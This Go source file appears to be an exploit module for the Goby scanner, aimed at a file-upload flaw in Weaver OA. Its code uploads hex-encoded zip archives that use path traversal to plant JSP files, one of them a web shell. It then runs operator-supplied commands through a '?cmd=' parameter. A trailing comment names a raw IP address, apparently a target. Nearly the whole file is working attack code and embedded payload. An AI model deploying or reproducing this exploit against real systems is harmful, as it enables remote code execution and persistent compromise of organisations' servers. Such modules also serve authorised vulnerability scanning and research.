package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver OA weaver.common.Ctrl",
    "Description": "Weaver OA is a platform which t by Shanghai Weaver Network Co., LTD.Users can read and deal with workflow、news、contacts and other kinds of information of OA.   Upload vulnerability exists of  '/weaver/weaver.common.Ctrl/.css'",
    "Product": "Weaver",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2021-05-24",
    "Author": "李大壮",
    "FofaQuery": "product=\"Weaver-OA\" || app=\"Wild - collaborative office OA\"",
    "Level": "3",
    "Impact": "<p>An attacker can exploit this vulnerability to cause remote code execution</p>",
    "Recommendation": "<p>An official patch has been released to fix this vulnerability. Affected users can also take the following protective measures for temporary protection against this vulnerability.</p>",
    "References": [
        "https://ailiqun.xyz/2021/05/02/%E6%B3%9B%E5%BE%AEOA-%E5%89%8D%E5%8F%B0GetShell%E5%A4%8D%E7%8E%B0/"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND"
    ],
    "ExploitSteps": null,
    "Tags": [
        "RCE"
    ],
    "CVEIDs": null,
    "CVSSScore": "9.0",
    "AttackSurfaces": {
        "Application": [
            "Weaver-OA"
        ],
        "Support": null,
        "Service": null,
        "System": [
            "Resin"
        ],
        "Hardware": null
    },
    "GobyQuery": "product=\"Weaver-OA\" || app=\"Wild - collaborative office OA\"",
    "PocId": "10196"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp"
			checkData := "504b0304140000000800d3a5b652bdd0a565b4000000d2000000150000002e2e2f2e2e2f2e2e2f457a7271663478382e6a73701d8ec90e82301445f77e45434252368d53dc3824926aa289750025b06be001d55a108ae8df5bbb79b9e72ece7d0b778050d56952374269a9b0821e05da406163db29f2146d4afc75b0994d29a455060df6486693dfe5b941e718c5a3033d8f59b8fbc4d14d24e16192d0b867e1fe99d0b264f4fa65f7c730a1d7a5e379dedcacfef577fee64454642b24605ed752a45c8b4a9102f405b83c715de2065e1db4fadf05d0bc25685b1b8df9c21060eb7357e620f403504b01021400140000000800d3a5b652bdd0a565b4000000d20000001500000000000000000000008001000000002e2e2f2e2e2f2e2e2f457a7271663478382e6a7370504b0506000000000100010043000000e70000000000"
			payload, _ := hex.DecodeString(checkData)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=96659c4ff80b4193cba17acfa5f1f109")
			cfg.Data = fmt.Sprintf("--96659c4ff80b4193cba17acfa5f1f109\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"Ezrqf4x8.zip\"\r\nContent-Type: application/zip\r\n\r\n%s\r\n--96659c4ff80b4193cba17acfa5f1f109--\r\n", string(payload))
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp, err := httpclient.SimpleGet(u.FixedHostInfo + "/cloudstore/Ezrqf4x8.jsp"); err == nil && strings.Contains(resp.RawBody, "9f5046521aebe37d6052fd8a452694d5") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp"
			shellHex := "504b03041400000008001aa9b65224443002cb010000b8030000150000002e2e2f2e2e2f2e2e2f6f4f4b596c3873352e6a737085535d4fdb30147de7577896901c891a5ac184448336b675dab48d8e5258417d7092dbc6ccb133e7a60521fefbec9016779bbafb625ffbf89cfbe5feee1b528a3990d468048d970f25c414e11ef7732cd4499a0b5b01c6e3cb41e7981225f4bc76f098de8985a064f774a7bf629045692cc6b4aa352f6495f2b3b7a30faf0fdf436a32b02d768738933366e1570d15f239e0505851008265342d321abd8a75ad54f4d840bd6df090ac5d63a261b979c7a293f5a3774a5415b1e870cd96cf8cfde674987f35422bf59cb554fc793dab67331f842806bdc9e8a89a5c1fe92fea7337d11765723d8e691405fc436b52700ae00458eb44ebdb95d926c3af80b9c9feaf7cf323579365ec95f65a244f7df011977a617e02fb93ef2fc1956dd7e95d1d8cf5559d7d5478f3bdd15b2bf8daef916dd4e7c91da4783b7d7c72516ee92309aae5a7854bc33fe9b246171b888248ed4a07fe65701ab6506a24c2613add97b3e401e1764a92b6fd8ddb3b383c9ebe404c8dbc74d923a3fdd2c2290d2897b954c09888a5e64e2e6349e4e6add30da66d8342e9b06b4938004fff14dc0f159f219e6095ffc0cb8bb2543215288df6d95f8050438179f827466017ca97d41dfbe664e03cf0c571bfc893fe06504b010214001400000008001aa9b65224443002cb010000b80300001500000000000000000000008001000000002e2e2f2e2e2f2e2e2f6f4f4b596c3873352e6a7370504b0506000000000100010043000000fe0100000000"
			payload, _ := hex.DecodeString(shellHex)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=96659c4ff80b4193cba17acfa5f1f109")
			cfg.Data = fmt.Sprintf("--96659c4ff80b4193cba17acfa5f1f109\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"oOKYl8s5.zip\"\r\nContent-Type: application/zip\r\n\r\n%s\r\n--96659c4ff80b4193cba17acfa5f1f109--\r\n", string(payload))
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/cloudstore/" + "oOKYl8s5.jsp?cmd=" + cmd); err == nil {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}

//http://101.32.184.165
